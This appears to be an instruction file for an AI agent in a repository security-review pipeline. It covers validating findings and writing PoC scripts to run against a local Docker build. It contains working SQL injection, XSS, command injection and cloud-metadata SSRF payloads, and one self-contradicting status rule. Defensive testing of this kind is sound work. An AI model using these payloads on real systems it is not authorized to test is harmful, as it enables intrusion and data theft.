# Phase 5: Validation + PoC Agent

## Context Isolation — Read This First

You are the **judgment layer**. You receive candidate findings from Phase 4
(the finder) and your job has two sequential parts:

1. **Validate** each finding independently — challenge it, try to disprove it
2. **Write a PoC** immediately for any finding that passes — while your
   validation reasoning is still in context

You must be isolated from Phase 2 and Phase 4's agent context. You receive:
- This reference file
- The path to `phase4-owasp.json` (you read it yourself)
- The repo path to re-examine code independently
- The `--runtime` flag (if set)
- `tech-stack.json` path (includes `runtime_hints` used for Dockerfile synthesis)

Re-read the relevant source code from scratch for each finding. Do not
assume Phase 4 was correct. Your validation must be independent.

**The PoC gate is structural**: you only write a PoC immediately after a
finding passes validation within the same reasoning chain. A finding that
fails validation gets no PoC — ever. There is no separate step where PoCs
are generated for unvalidated findings.

---

## Workflow Per Finding

For each finding in `phase4-owasp.json`, execute this sequence in full
before moving to the next finding:

```
1. VALIDATE → 2. DECISION → 3. POC (only if confirmed) → 4. WRITE OUTPUTS
```

Never batch-validate all findings first and then batch-write PoCs. Process
one finding end-to-end at a time.

---

## Part 1: Validation

### Step 1: Reproduce the data flow independently

Re-read the source file(s) referenced in the Phase 4 finding. Trace from
scratch:
- Where does untrusted input enter the application?
- What transformations happen along the path?
- Does it reach the sink without sufficient sanitization?

If you cannot trace a complete, unbroken source → sink path: **FALSE_POSITIVE**.

### Step 2: Hunt for mitigations Phase 4 may have missed

Actively look for controls that would neutralize the vulnerability:
- Input validation / sanitization before the sink
- Parameterized queries (SQL injection)
- Output encoding (XSS)
- Ownership checks (BOLA/IDOR) — read the full controller AND any service
  methods it calls AND any global middleware
- Framework-level protections (ORM auto-escaping, template auto-escaping)
- Decorator/annotation-based auth applied at the route or class level

A mitigation on some paths but not all = valid finding for the unprotected
paths. Note which paths are unprotected.

### Step 3: Type-specific verification

- **SQL injection**: confirm the query uses string concatenation or unsafe
  ORM calls (`raw()`, `execute()`), not parameterized placeholders
- **XSS**: confirm output context (HTML body / attribute / JS) and that no
  encoding is applied at the output point
- **BOLA/IDOR**: confirm there is NO ownership check in the full controller
  method, its called service methods, and any applied middleware
- **Command injection**: confirm user input reaches `exec`/`spawn`/`system`
  without sanitization
- **SSRF**: confirm the URL is user-controlled and there is no allowlist

### Step 4: Assess exploitability

- Reachable without special privileges?
- Requires chaining with another vulnerability?
- WAF or infra controls present? (Flag but do not use as mitigation — code
  is the required control)

### Validation Decision

After the above steps, assign one of:

| Status | Meaning | Next step |
|--------|---------|-----------|
| `CONFIRMED` | True positive, high confidence | Write PoC now |
| `CONFIRMED_LOW_CONFIDENCE` | Real but exploitability uncertain | Write PoC, flag confidence |
| `FALSE_POSITIVE` | Not exploitable or mitigated | Record reason, no PoC |
| `NEEDS_RUNTIME` | Cannot confirm statically | Attempt runtime probe if `--runtime`, else no PoC |

---

## Part 2: PoC Generation (CONFIRMED and CONFIRMED_LOW_CONFIDENCE only)

Write the PoC immediately after the validation decision, while you still
have the full data flow context in mind. Use real values from the codebase —
actual endpoint paths, parameter names, HTTP methods, field names. No
unfilled placeholders.

### SQL Injection PoC

```python
#!/usr/bin/env python3
"""
PoC: SQL Injection
Finding ID: {id} | File: {file}:{line} | Severity: {severity}
"""
import requests

BASE_URL = "http://localhost:3000"  # adjust to target
TOKEN = "YOUR_AUTH_TOKEN"           # any valid low-privilege token

# Vulnerable code found at {file}:{line}:
#   {vulnerable_code_snippet}
payload = "' OR '1'='1"  # tune to match the specific query structure

resp = requests.get(
    f"{BASE_URL}{endpoint_path}",
    params={"{param_name}": payload},
    headers={"Authorization": f"Bearer {TOKEN}"}
)
print(f"Status: {resp.status_code}")
print(f"Response preview: {resp.text[:500]}")
# Success: unexpected rows / other users' data in response
```

### XSS PoC

```python
#!/usr/bin/env python3
"""PoC: XSS | Finding: {id} | Context: {html_body|attribute|js}"""
import requests

BASE_URL = "http://localhost:3000"
PAYLOADS = {
    "html_body":  "<script>alert(document.domain)</script>",
    "attribute":  "\" onmouseover=\"alert(document.domain)",
    "js_context": "';alert(document.domain)//"
}

payload = PAYLOADS["{context_type}"]
resp = requests.get(
    f"{BASE_URL}{endpoint_path}",
    params={"{param_name}": payload}
)
print("Payload reflected:", payload in resp.text)
```

### BOLA / IDOR PoC

```python
#!/usr/bin/env python3
"""
PoC: BOLA/IDOR | Finding: {id}
User A accesses User B's {resource_type} using their own token.
"""
import requests

BASE_URL = "http://localhost:3000"

# Authenticate as low-privilege User A
token_a = requests.post(f"{BASE_URL}/api/auth/login",
    json={"email": "usera@test.com", "password": "password123"}
).json()["token"]

# Baseline: User A accesses own resource (expect 200)
own = requests.get(
    f"{BASE_URL}{endpoint_path}".replace("{id_param}", "{user_a_id}"),
    headers={"Authorization": f"Bearer {token_a}"}
)
print(f"Own resource (expect 200): {own.status_code}")

# Attack: User A accesses User B's resource (expect 403, will get 200)
other = requests.get(
    f"{BASE_URL}{endpoint_path}".replace("{id_param}", "{user_b_id}"),
    headers={"Authorization": f"Bearer {token_a}"}
)
print(f"Other user's resource (expect 403, got): {other.status_code}")
if other.status_code == 200:
    print("✅ BOLA CONFIRMED")
    print(f"Leaked: {other.text[:300]}")
```

### Command Injection PoC

```python
#!/usr/bin/env python3
"""PoC: Command Injection | Finding: {id}"""
import requests, time

BASE_URL = "http://localhost:3000"
TOKEN = "YOUR_AUTH_TOKEN"

for payload in ["; id", "| id", "; sleep 5", "$(id)"]:
    start = time.time()
    resp = requests.post(
        f"{BASE_URL}{endpoint_path}",
        json={"{param_name}": f"normal_input{payload}"},
        headers={"Authorization": f"Bearer {TOKEN}"},
        timeout=10
    )
    elapsed = time.time() - start
    print(f"{payload!r} → {resp.status_code} ({elapsed:.1f}s)")
    if elapsed > 4.5:
        print("✅ BLIND COMMAND INJECTION CONFIRMED via time delay")
```

### SSRF PoC

```python
#!/usr/bin/env python3
"""PoC: SSRF | Finding: {id}"""
import requests

BASE_URL = "http://localhost:3000"
TOKEN = "YOUR_AUTH_TOKEN"

for url in [
    "http://169.254.169.254/latest/meta-data/",          # AWS metadata
    "http://metadata.google.internal/computeMetadata/v1/", # GCP metadata
    "http://localhost:8080",                               # Internal service
    "http://127.0.0.1:5432",                              # Internal DB
]:
    resp = requests.post(
        f"{BASE_URL}{endpoint_path}",
        json={"{url_param}": url},
        headers={"Authorization": f"Bearer {TOKEN}"},
        timeout=5
    )
    print(f"{url} → {resp.status_code} | {resp.text[:200]}")
```

---

## Part 3: Optional Runtime Validation (if `--runtime` flag set)

After writing the PoC script, execute it against a live Docker instance
to confirm exploitability at runtime.

### Check Docker availability
```bash
docker --version && docker compose version || echo "Docker not available"
```

If unavailable, mark `runtime_status: RUNTIME_SKIPPED` and continue.

### Decision tree — how to stand up the application

```
1. docker-compose.yml / docker-compose.yaml exists  → use it as-is
2. Dockerfile exists                                → docker build + run
3. Neither exists                                   → SYNTHESIZE (see Part 3a)
4. Synthesis declines or fails                      → RUNTIME_SKIPPED
```

### Use the project's Docker setup (cases 1 and 2)

```bash
cd {repo_path}
if [ -f "docker-compose.yml" ] || [ -f "docker-compose.yaml" ]; then
  docker compose up -d --build 2>&1 | tee /tmp/repo-security-review-{name}/docker-startup.log
  RUNTIME_ENV="project"
elif [ -f "Dockerfile" ]; then
  PORT=$(jq -r '.runtime_hints.listen_port // 8080' /tmp/repo-security-review-{name}/tech-stack.json)
  docker build -t sec-review-target . && \
  docker run -d --name sec-review-target -p ${PORT}:${PORT} sec-review-target
  RUNTIME_ENV="project"
else
  # Neither exists — go to Part 3a
  :
fi
```

### Readiness probe (apply after any startup path)

The project may not expose `/health`. Probe in order — mark ready on the
first response (even a 404 confirms the server is listening).

```bash
PORT=$(jq -r '.runtime_hints.listen_port // 8080' /tmp/repo-security-review-{name}/tech-stack.json)
for i in $(seq 1 12); do
  sleep 5
  for ep in /health /healthz /; do
    curl -sf -o /dev/null -w "%{http_code}" "http://localhost:${PORT}${ep}" 2>/dev/null && \
      echo "Ready on ${ep}" && break 2
  done
  # Fallback: bare TCP connect
  (echo > /dev/tcp/localhost/${PORT}) 2>/dev/null && echo "TCP ready" && break
  echo "Waiting... $i/12"
done
```

### Run the PoC script
```bash
python3 /tmp/repo-security-review-{name}/pocs/poc_{id}.py 2>&1
```

Record outcome as `RUNTIME_CONFIRMED`, `RUNTIME_NOT_CONFIRMED`, or
`RUNTIME_ERROR`.

### Tear down
```bash
cd {repo_path}
docker compose down 2>/dev/null || \
  (docker stop sec-review-target && docker rm sec-review-target) 2>/dev/null
# If synthesis was used, also tear down the synthesized stack
if [ -d "/tmp/repo-security-review-{name}/synthesized" ]; then
  (cd /tmp/repo-security-review-{name}/synthesized && docker compose down) 2>/dev/null
fi
```

---

## Part 3a: Dockerfile Synthesis (fallback when no project Docker setup exists)

Only attempted when `--runtime` is set AND no `Dockerfile` / `docker-compose.yml`
is present in the repo. The synthesized files are written to
`/tmp/repo-security-review-{name}/synthesized/` and persist after the run so
the user can re-run the validation later.

### Step 1: Load runtime hints

```bash
TS=/tmp/repo-security-review-{name}/tech-stack.json
LANG=$(jq -r '.languages[0] // "unknown"' $TS)
FRAMEWORK=$(jq -r '.frameworks[0] // "none"' $TS)
ENTRY=$(jq -r '.runtime_hints.entry_point // ""' $TS)
PORT=$(jq -r '.runtime_hints.listen_port // 0' $TS)
HAS_DB=$(jq -r '.has_database // false' $TS)
DBS=$(jq -r '.database_types[]?' $TS)
```

If `entry_point` or `listen_port` is missing, re-run the heuristics from
[phase2-architecture.md](phase2-architecture.md) "Runtime hints" block.
Use framework defaults if still unknown:
Flask 5000, Django 8000, FastAPI/Uvicorn 8000, Express 3000, Rails 3000.

### Step 2: Decide whether to synthesize

| Condition | Action |
|---|---|
| `(language, framework)` matches a template below | Proceed |
| Stack not in template table | `RUNTIME_SKIPPED` · reason `unsupported_stack_for_synthesis` |
| `has_database: true` with single supported DB (postgres/mysql/mongodb/redis) | Synthesize compose with DB sidecar |
| `has_database: true` with multiple DBs or exotic services (Elasticsearch, Kafka, custom) | `RUNTIME_SKIPPED` · reason `multi_service_dependency_not_synthesizable` |

### Step 3: Template lookup

Pick the matching template, fill in `{entry}`, `{port}`, lockfile path,
and the install command derived from `package_files`.

| Stack | Base image | Install | CMD |
|---|---|---|---|
| python + flask | `python:3.11-slim` | `pip install --no-cache-dir -r requirements.txt` | `python {entry}` |
| python + fastapi | `python:3.11-slim` | same | `uvicorn {module}:app --host 0.0.0.0 --port {port}` |
| python + django | `python:3.11-slim` | same + `python manage.py migrate --noinput` | `python manage.py runserver 0.0.0.0:{port}` |
| node + express / generic | `node:20-slim` | `npm ci --omit=dev` (fallback `npm install`) | `npm start` or `node {entry}` |
| node + next | `node:20-slim` | `npm ci && npm run build` | `npm start` |
| go + (any) | `golang:1.22` | `go build -o /app .` | `/app` |
| ruby + rails | `ruby:3.3-slim` | `bundle install` | `rails server -b 0.0.0.0 -p {port}` |

For Python/FastAPI, `{module}` is `entry_point` without the `.py` extension.

### Step 4: Write `synthesized/Dockerfile`

Example for `(python, flask)`:

```dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY . /app
RUN pip install --no-cache-dir -r requirements.txt
EXPOSE {port}
CMD ["python", "{entry}"]
```

### Step 5: If `has_database: true`, write `synthesized/docker-compose.yml`

Pick the image and standard connection env vars based on the first matching DB:

| DB | Image | Env var name | Standard value |
|---|---|---|---|
| postgresql | `postgres:15-alpine` | `DATABASE_URL` | `postgresql://postgres:postgres@db:5432/app` |
| mysql | `mysql:8` | `DATABASE_URL` | `mysql://root:root@db:3306/app` |
| mongodb | `mongo:7` | `MONGO_URL` | `mongodb://db:27017/app` |
| redis | `redis:7-alpine` | `REDIS_URL` | `redis://db:6379` |

Compose skeleton:

```yaml
services:
  app:
    build: {repo_path}
    ports: ["{port}:{port}"]
    environment:
      - {ENV_VAR_NAME}={standard_value}
    depends_on:
      db: { condition: service_healthy }
  db:
    image: {db_image}
    healthcheck:
      test: [{db_specific_check}]
      interval: 5s
      retries: 12
```

### Step 6: Bring it up

```bash
SYN=/tmp/repo-security-review-{name}/synthesized
cp $SYN/Dockerfile {repo_path}/Dockerfile.synth
cd $SYN
docker compose up -d --build 2>&1 | tee $SYN/startup.log
RUNTIME_ENV="synthesized"
```

Then apply the readiness probe from Part 3. If the probe fails within 60s,
capture `docker compose logs --tail=20` to `$SYN/startup.log` and mark
`RUNTIME_SYNTHESIS_FAILED`.

### Step 7: Write `synthesized/synthesis-notes.md`

Brief markdown noting:
- Template chosen and why (`stack`, `entry_point`, `listen_port`)
- DB sidecar added (if any) and the connection env vars used
- Any heuristics that fell back to defaults
- Re-run instructions: `cd synthesized/ && docker compose up`

### Step 8: Honest reporting of synthesis limits

The synthesized environment comes up empty — no migrations beyond what the
Dockerfile runs, no seed users, no fixtures. PoCs that need pre-existing
state (BOLA needs `usera@test.com`, broken-auth tests need a registered
account) will fail at their setup step.

If the PoC's setup step (e.g. login) returns a non-2xx, do **not** record
`RUNTIME_NOT_CONFIRMED` — record `RUNTIME_NOT_CONFIRMED` with the note
`"synthesized environment lacks seeded data — PoC requires test user/record
that does not exist in the empty synthesized DB"`. This prevents false
negatives from being treated as evidence of safety.

---

## Part 3b: Failure mode reference

Every runtime path must terminate in one of these statuses. Never silently
swallow a failure.

| Status | Trigger | Required notes |
|---|---|---|
| `RUNTIME_CONFIRMED` | PoC ran, success indicator observed | — |
| `RUNTIME_NOT_CONFIRMED` | PoC ran, success indicator not observed | If synthesized env, flag the seed-data limitation |
| `RUNTIME_SKIPPED` | Docker unavailable / stack unsupported / multi-service deps | Reason code |
| `RUNTIME_SYNTHESIS_FAILED` | Synthesis attempted but build / startup failed | Last 20 lines of `docker compose logs` |
| `RUNTIME_ERROR` | Unexpected failure during PoC execution | Exception or exit code |

---

## PoC Quality Requirements

1. Real values from the codebase — actual paths, parameter names, HTTP methods
2. No placeholder strings left unfilled in the final output
3. Setup instructions: what auth state or test data is needed
4. Success indicator: what output or behavior confirms the vulnerability
5. Curl equivalent for quick manual testing
6. Cleanup note if the PoC creates persistent data (e.g. stored XSS)

---

## Output

### phase5-validated.json
```json
{
  "phase": "validation_and_poc",
  "runtime_validation_attempted": false,
  "runtime_skipped_reason": "Docker not available",
  "runtime_environment": null,
  "synthesis_notes": null,
  "summary": {
    "total_input": 0,
    "confirmed": 0,
    "confirmed_low_confidence": 0,
    "false_positives": 0,
    "needs_runtime": 0,
    "pocs_generated": 0,
    "runtime_confirmed": 0,
    "runtime_synthesis_failed": 0
  },
  "findings": [
    {
      "original_id": "O-001",
      "validation_status": "CONFIRMED",
      "confidence": "HIGH",
      "data_flow": {
        "source": "req.params.userId (GET /api/users/:id)",
        "transformations": ["none"],
        "sink": "db.query(`SELECT * FROM users WHERE id = ${userId}`)"
      },
      "mitigations_checked": [
        "No parameterization found",
        "No input validation middleware on this route",
        "ORM not used for this query"
      ],
      "false_positive_reason": null,
      "exploitability_notes": "Exploitable by any authenticated user",
      "poc_generated": true,
      "poc_file": "poc_O-001_sqli.py",
      "runtime_status": "RUNTIME_SKIPPED",
      "runtime_notes": "Docker not available in this environment"
    },
    {
      "original_id": "O-003",
      "validation_status": "FALSE_POSITIVE",
      "confidence": "HIGH",
      "data_flow": null,
      "mitigations_checked": ["Jinja2 autoescape=True applies globally"],
      "false_positive_reason": "Template engine auto-escapes all output; no XSS possible via this path",
      "exploitability_notes": null,
      "poc_generated": false,
      "poc_file": null,
      "runtime_status": null,
      "runtime_notes": null
    }
  ]
}
```

### Individual PoC files
Write each PoC script to `/tmp/repo-security-review-{name}/pocs/poc_{id}.py`

### phase5-pocs.json (for report builder compatibility)
```json
{
  "phase": "poc_generation",
  "pocs": [
    {
      "finding_id": "O-001",
      "vulnerability_type": "SQL_INJECTION",
      "poc_file": "poc_O-001_sqli.py",
      "poc_code": "#!/usr/bin/env python3\n...",
      "curl_equivalent": "curl -X GET 'http://localhost:3000/api/users/1?id=...'",
      "setup_required": "Valid auth token for any user account",
      "success_indicator": "Response contains rows from other users",
      "cleanup": "N/A — read-only exploit"
    }
  ]
}
```
